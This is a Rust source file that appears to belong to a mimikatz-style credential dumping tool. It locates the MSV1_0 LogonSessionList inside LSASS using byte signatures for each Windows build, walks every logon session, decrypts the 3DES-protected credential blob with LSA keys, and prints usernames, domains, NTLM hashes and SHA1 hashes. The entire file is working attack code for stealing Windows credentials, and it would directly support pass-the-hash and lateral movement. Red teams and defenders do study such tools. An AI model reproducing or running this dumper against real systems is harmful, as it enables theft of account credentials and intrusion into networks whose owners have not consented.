//! MSV1_0 `LogonSessionList` traversal.
//!
//! Each entry in the list points (via offset `+credentials → +0x10`) to a
//! primary credential record whose `+0x30` field holds a 0x1B0-byte 3DES-
//! encrypted blob. After decrypting we lift the NTLM hash from bytes
//! `70..86` and the SHA1 hash from bytes `102..122`.

use crate::MemReader;
use crate::lsa::{self, LsaKeys};
use crate::pe;

// ─── Per-build constants ───────────────────────────────────────────────────

struct ListHeadPattern {
    build:  u32,
    sig:    &'static [u8],
    offset: i32,   // displacement from sig match to RIP-relative target field
}

#[rustfmt::skip]
const LIST_HEAD_TABLE: &[ListHeadPattern] = &[
    ListHeadPattern { build:  2600,    offset: -4, sig: &[0x4c,0x8b,0xdf,0x49,0xc1,0xe3,0x04,0x48,0x8b,0xcb,0x4c,0x03,0xd8] },
    ListHeadPattern { build:  3790,    offset: -4, sig: &[0x4c,0x8b,0xdf,0x49,0xc1,0xe3,0x04,0x48,0x8b,0xcb,0x4c,0x03,0xd8] },
    ListHeadPattern { build:  6000,    offset: 21, sig: &[0x33,0xff,0x45,0x85,0xc0,0x41,0x89,0x75,0x00,0x4c,0x8b,0xe3,0x0f,0x84] },
    ListHeadPattern { build:  7600,    offset: 19, sig: &[0x33,0xf6,0x45,0x89,0x2f,0x4c,0x8b,0xf3,0x85,0xff,0x0f,0x84] },
    ListHeadPattern { build:  9200,    offset: 16, sig: &[0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74] },
    ListHeadPattern { build:  9600,    offset: 36, sig: &[0x8b,0xde,0x48,0x8d,0x0c,0x5b,0x48,0xc1,0xe1,0x05,0x48,0x8d,0x05] },
    ListHeadPattern { build: 10240,    offset: 16, sig: &[0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74] },
    ListHeadPattern { build: 15063,    offset: 23, sig: &[0x33,0xff,0x45,0x89,0x37,0x48,0x8b,0xf3,0x45,0x85,0xc9,0x74] },
    ListHeadPattern { build: 17134,    offset: 23, sig: &[0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc9,0x74] },
    ListHeadPattern { build: 18362,    offset: 23, sig: &[0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74] },
    ListHeadPattern { build: 20348,    offset: 24, sig: &[0x45,0x89,0x34,0x24,0x4c,0x8b,0xff,0x8b,0xf3,0x45,0x85,0xc0,0x74] },
    ListHeadPattern { build: 22621,    offset: 27, sig: &[0x45,0x89,0x37,0x4c,0x8b,0xf7,0x8b,0xf3,0x45,0x85,0xc0,0x0f,0x84] },
    ListHeadPattern { build: 26100,    offset: 14, sig: &[0x0f,0x1f,0x44,0x00,0x00,0x8b,0xc3,0x48,0xc1,0xe0,0x04] },
    ListHeadPattern { build: u32::MAX, offset: 14, sig: &[0x0f,0x1f,0x44,0x00,0x00,0x8b,0xc3,0x48,0xc1,0xe0,0x04] },
];

fn pick_list_head_pattern(build: u32) -> &'static ListHeadPattern {
    for w in LIST_HEAD_TABLE.windows(2) {
        if build >= w[0].build && build < w[1].build { return &w[0]; }
    }
    &LIST_HEAD_TABLE[LIST_HEAD_TABLE.len() - 2]
}

/// Offsets inside the per-session record.
struct MsvOffsets { username: u64, domain: u64, credentials: u64 }

fn msv_offsets(build: u32) -> MsvOffsets {
    if build >= 26100 {
        MsvOffsets { username: 0xA0, domain: 0xB0, credentials: 0x118 }
    } else {
        MsvOffsets { username: 0x90, domain: 0xA0, credentials: 0x108 }
    }
}

// ─── Locate the list head ─────────────────────────────────────────────────

/// Resolve the local-process VA of `LogonSessionList`.
pub fn locate_list_head_local(build: u32) -> Result<u64, String> {
    let pat  = pick_list_head_pattern(build);
    let base = lsa::local_lsasrv_base()?;
    let text = pe::text_section(base)?;
    let off  = pe::find_pattern(text, pat.sig)
        .ok_or_else(|| format!("LogonSessionList pattern not found for build {build}"))?;
    unsafe {
        Ok(pe::decode_rip_relative(text.as_ptr().add(off).offset(pat.offset as isize)))
    }
}

// ─── Dump ──────────────────────────────────────────────────────────────────

/// Walk the LogonSessionList and print decrypted NT / SHA1 hashes per entry.
pub fn dump(
    reader:        &impl MemReader,
    list_head:     u64,
    keys:          &LsaKeys,
    build:         u32,
) {
    let off  = msv_offsets(build);
    let mut entry = reader.read_u64(list_head);
    let mut idx   = 0u32;

    while entry != 0 && entry != list_head {
        idx += 1;

        let user   = reader.read_unicode_string(entry + off.username);
        let domain = reader.read_unicode_string(entry + off.domain);
        let cred   = reader.read_u64(entry + off.credentials);

        println!("\n[{idx:04}] LogonSession @ 0x{entry:016X}");
        println!("  User   : {}", display_or_null(&user));
        println!("  Domain : {}", display_or_null(&domain));

        if !user.is_empty() && !domain.is_empty() && cred != 0 {
            let primary = reader.read_u64(cred + 0x10);
            if primary != 0 {
                // Fixed-size encrypted blob (NOT a UNICODE_STRING).
                let crypto = reader.read_bytes(primary + 0x30, 0x1B0);
                match lsa::bcrypt_3des_decrypt(&keys.des3_key, &keys.iv, &crypto) {
                    Some(plain) => {
                        if plain.len() >= 86 {
                            print!("  NTHash : ");
                            for b in &plain[70..86] { print!("{b:02x}"); }
                            println!();
                        }
                        if plain.len() >= 122 {
                            print!("  SHA1   : ");
                            for b in &plain[102..122] { print!("{b:02x}"); }
                            println!();
                        }
                    }
                    None => {
                        print!("  CryptoBlob: ");
                        for b in &crypto[..16.min(crypto.len())] { print!("{b:02x}"); }
                        println!(" ...");
                    }
                }
            } else {
                println!("  NTHash : (null)");
            }
        } else {
            println!("  NTHash : (null)");
        }

        let next = reader.read_u64(entry);
        if next == entry { break; }
        entry = next;
        if idx > 500 { break; }
    }
}

fn display_or_null(s: &str) -> &str {
    if s.is_empty() { "(null)" } else { s }
}
